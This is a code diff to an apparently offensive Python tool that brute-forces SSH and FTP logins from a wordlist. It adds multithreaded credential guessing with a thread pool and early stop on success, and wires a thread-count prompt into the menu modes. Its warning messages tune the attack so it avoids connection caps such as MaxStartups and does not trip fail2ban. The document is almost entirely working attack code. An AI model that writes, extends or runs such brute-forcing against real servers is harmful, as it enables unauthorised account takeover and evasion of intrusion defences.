@@ -129,6 +129,19 @@ def load_userlist(filepath):
         return []
 
 
+def prompt_threads():
+    """Shared prompt for the opt-in concurrency used by the SSH/FTP attacks.
+    Default 1 keeps the sequential behaviour; a modest count speeds up the
+    slow per-connection protocols without flooding the target."""
+    t = input(colored(
+        "[*] Concurrent threads (1 = sequential; 5-10 recommended for SSH/FTP; "
+        "default 1): ", 'cyan')).strip()
+    try:
+        return max(1, int(t)) if t else 1
+    except ValueError:
+        return 1
+
+
 def print_banner():
     print(colored("""
 ╔═══════════════════════════════════════════════════╗
@@ -322,7 +335,25 @@ def build_patterns(usernames):
 #  SSH ATTACK
 # ════════════════════════════════════════════════════════════════
 
-def ssh_attack(host, port, usernames, password_file, delay):
+def _try_ssh(host, port, username, password):
+    """One SSH auth attempt. Returns True on success, False otherwise.
+    Each call builds its own client, so this is safe to run concurrently."""
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(host, port=port, username=username, password=password,
+                       timeout=3, banner_timeout=3, auth_timeout=3)
+        return True
+    except Exception:
+        return False
+    finally:
+        try:
+            client.close()
+        except Exception:
+            pass
+
+
+def ssh_attack(host, port, usernames, password_file, delay, threads=1):
     if not PARAMIKO_AVAILABLE:
         print(colored("[-] paramiko not installed. Run: pip install paramiko --break-system-packages", 'red'))
         return None
@@ -331,7 +362,7 @@ def ssh_attack(host, port, usernames, password_file, delay):
     print(colored(f"[*] Usernames to try: {len(usernames)}", 'cyan'))
     try:
         with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
-            passwords = f.read().splitlines()
+            passwords = [p.strip() for p in f.read().splitlines()]
     except FileNotFoundError:
         print(colored(f"[-] Password file not found: {password_file}", 'red'))
         return None
@@ -339,34 +370,71 @@ def ssh_attack(host, port, usernames, password_file, delay):
     total = len(passwords)
     print(colored(f"[*] Loaded {total} passwords", 'cyan'))
 
-    for username in usernames:
-        print(colored(f"\n[*] Attacking SSH user: {username}", 'yellow'))
-        for count, password in enumerate(passwords, 1):
-            password = password.strip()
-            sys.stdout.write(colored(
-                f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
-            sys.stdout.flush()
-
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            try:
-                client.connect(host, port=port, username=username, password=password,
-                               timeout=3, banner_timeout=3, auth_timeout=3)
-                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
-                print(colored(f"  [+] Username: {username}", 'green'))
-                print(colored(f"  [+] Password: {password}", 'green'))
-                client.close()
-                return username, password
-            except paramiko.AuthenticationException:
-                pass
-            except Exception:
-                pass
-            finally:
-                try:
-                    client.close()
-                except:
-                    pass
+    # ---- Sequential path ----
+    if threads <= 1:
+        print(colored("[*] Mode: sequential (1 worker)", 'cyan'))
+        for username in usernames:
+            print(colored(f"\n[*] Attacking SSH user: {username}", 'yellow'))
+            for count, password in enumerate(passwords, 1):
+                sys.stdout.write(colored(
+                    f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
+                sys.stdout.flush()
+                if _try_ssh(host, port, username, password):
+                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+                    print(colored(f"  [+] Username: {username}", 'green'))
+                    print(colored(f"  [+] Password: {password}", 'green'))
+                    return username, password
                 time.sleep(delay)
+        print(colored(f"\n\n[-] SSH attack complete -- no valid credentials found", 'red'))
+        return None
+
+    # ---- Threaded path ----
+    print(colored(f"[*] Mode: threaded ({threads} workers)", 'cyan'))
+    print(colored("[!] Keep SSH threads modest (5-10): too many parallel connects "
+                   "get dropped by MaxStartups or trip fail2ban.", 'yellow'))
+    combos = [(u, p) for u in usernames for p in passwords]
+    grand_total = len(combos)
+    found = {'creds': None}
+    found_event = threading.Event()
+    progress = {'done': 0}
+    progress_lock = threading.Lock()
+
+    def worker(creds):
+        if found_event.is_set():
+            return None
+        u, p = creds
+        ok = _try_ssh(host, port, u, p)
+        if delay:
+            time.sleep(delay)
+        with progress_lock:
+            progress['done'] += 1
+            if progress['done'] % 25 == 0 or progress['done'] == grand_total:
+                sys.stdout.write(colored(
+                    f"\r  [*] Tried {progress['done']}/{grand_total}", 'red'))
+                sys.stdout.flush()
+        if ok:
+            found['creds'] = (u, p)
+            found_event.set()
+            return creds
+        return None
+
+    with ThreadPoolExecutor(max_workers=threads) as pool:
+        futures = []
+        for creds in combos:
+            if found_event.is_set():
+                break
+            futures.append(pool.submit(worker, creds))
+        for fut in as_completed(futures):
+            if fut.result():
+                found_event.set()
+                break
+
+    if found['creds']:
+        u, p = found['creds']
+        print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+        print(colored(f"  [+] Username: {u}", 'green'))
+        print(colored(f"  [+] Password: {p}", 'green'))
+        return u, p
 
     print(colored(f"\n\n[-] SSH attack complete -- no valid credentials found", 'red'))
     return None
@@ -376,12 +444,35 @@ def ssh_attack(host, port, usernames, password_file, delay):
 #  FTP ATTACK
 # ════════════════════════════════════════════════════════════════
 
-def ftp_attack(host, port, usernames, password_file, delay):
+def _try_ftp(host, port, username, password):
+    """One FTP auth attempt. Returns True on success, False otherwise.
+    Each call opens its own connection, so it is safe to run concurrently."""
+    ftp = None
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=3)
+        ftp.login(username, password)
+        return True
+    except Exception:
+        return False
+    finally:
+        try:
+            if ftp is not None:
+                ftp.quit()
+        except Exception:
+            try:
+                if ftp is not None:
+                    ftp.close()
+            except Exception:
+                pass
+
+
+def ftp_attack(host, port, usernames, password_file, delay, threads=1):
     print(colored(f"\n[*] Starting FTP attack on {host}:{port}", 'cyan'))
     print(colored(f"[*] Usernames to try: {len(usernames)}", 'cyan'))
     try:
         with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
-            passwords = f.read().splitlines()
+            passwords = [p.strip() for p in f.read().splitlines()]
     except FileNotFoundError:
         print(colored(f"[-] Password file not found: {password_file}", 'red'))
         return None
@@ -389,28 +480,71 @@ def ftp_attack(host, port, usernames, password_file, delay):
     total = len(passwords)
     print(colored(f"[*] Loaded {total} passwords", 'cyan'))
 
-    for username in usernames:
-        print(colored(f"\n[*] Attacking FTP user: {username}", 'yellow'))
-        for count, password in enumerate(passwords, 1):
-            password = password.strip()
-            sys.stdout.write(colored(
-                f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
-            sys.stdout.flush()
-            try:
-                ftp = ftplib.FTP()
-                ftp.connect(host, port, timeout=3)
-                ftp.login(username, password)
-                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
-                print(colored(f"  [+] Username: {username}", 'green'))
-                print(colored(f"  [+] Password: {password}", 'green'))
-                ftp.quit()
-                return username, password
-            except ftplib.error_perm:
-                pass
-            except Exception:
-                pass
-            finally:
+    # ---- Sequential path ----
+    if threads <= 1:
+        print(colored("[*] Mode: sequential (1 worker)", 'cyan'))
+        for username in usernames:
+            print(colored(f"\n[*] Attacking FTP user: {username}", 'yellow'))
+            for count, password in enumerate(passwords, 1):
+                sys.stdout.write(colored(
+                    f"\r  [*] Trying ({count}/{total}): {username}:{password:<30}", 'red'))
+                sys.stdout.flush()
+                if _try_ftp(host, port, username, password):
+                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+                    print(colored(f"  [+] Username: {username}", 'green'))
+                    print(colored(f"  [+] Password: {password}", 'green'))
+                    return username, password
                 time.sleep(delay)
+        print(colored(f"\n\n[-] FTP attack complete -- no valid credentials found", 'red'))
+        return None
+
+    # ---- Threaded path ----
+    print(colored(f"[*] Mode: threaded ({threads} workers)", 'cyan'))
+    print(colored("[!] Keep FTP threads modest (5-10): many servers cap "
+                   "concurrent connections per IP and will drop the rest.", 'yellow'))
+    combos = [(u, p) for u in usernames for p in passwords]
+    grand_total = len(combos)
+    found = {'creds': None}
+    found_event = threading.Event()
+    progress = {'done': 0}
+    progress_lock = threading.Lock()
+
+    def worker(creds):
+        if found_event.is_set():
+            return None
+        u, p = creds
+        ok = _try_ftp(host, port, u, p)
+        if delay:
+            time.sleep(delay)
+        with progress_lock:
+            progress['done'] += 1
+            if progress['done'] % 25 == 0 or progress['done'] == grand_total:
+                sys.stdout.write(colored(
+                    f"\r  [*] Tried {progress['done']}/{grand_total}", 'red'))
+                sys.stdout.flush()
+        if ok:
+            found['creds'] = (u, p)
+            found_event.set()
+            return creds
+        return None
+
+    with ThreadPoolExecutor(max_workers=threads) as pool:
+        futures = []
+        for creds in combos:
+            if found_event.is_set():
+                break
+            futures.append(pool.submit(worker, creds))
+        for fut in as_completed(futures):
+            if fut.result():
+                found_event.set()
+                break
+
+    if found['creds']:
+        u, p = found['creds']
+        print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+        print(colored(f"  [+] Username: {u}", 'green'))
+        print(colored(f"  [+] Password: {p}", 'green'))
+        return u, p
 
     print(colored(f"\n\n[-] FTP attack complete -- no valid credentials found", 'red'))
     return None
@@ -1153,8 +1287,9 @@ def main():
         usernames = prompt_usernames()
         delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
         delay = float(delay) if delay.strip() else 0.5
+        threads = prompt_threads()
         password_file = prompt_wordlist()
-        ssh_attack(host, port, usernames, password_file, delay)
+        ssh_attack(host, port, usernames, password_file, delay, threads)
 
     elif mode == '6':
         host = input(colored("[*] Enter target host/IP: ", 'cyan'))
@@ -1163,8 +1298,9 @@ def main():
         usernames = prompt_usernames()
         delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
         delay = float(delay) if delay.strip() else 0.5
+        threads = prompt_threads()
         password_file = prompt_wordlist()
-        ftp_attack(host, port, usernames, password_file, delay)
+        ftp_attack(host, port, usernames, password_file, delay, threads)
 
     elif mode == '7':
         host = input(colored("[*] Enter target host/IP: ", 'cyan'))
@@ -1177,11 +1313,12 @@ def main():
         usernames = prompt_usernames()
         delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
         delay = float(delay) if delay.strip() else 0.5
+        threads = prompt_threads()
         password_file = prompt_wordlist()
         if protocol == 'ssh':
-            ssh_attack(host, port, usernames, password_file, delay)
+            ssh_attack(host, port, usernames, password_file, delay, threads)
         elif protocol == 'ftp':
-            ftp_attack(host, port, usernames, password_file, delay)
+            ftp_attack(host, port, usernames, password_file, delay, threads)
 
     elif mode == '8':
         print(colored("\n[*] Username enumeration method:", 'cyan'))
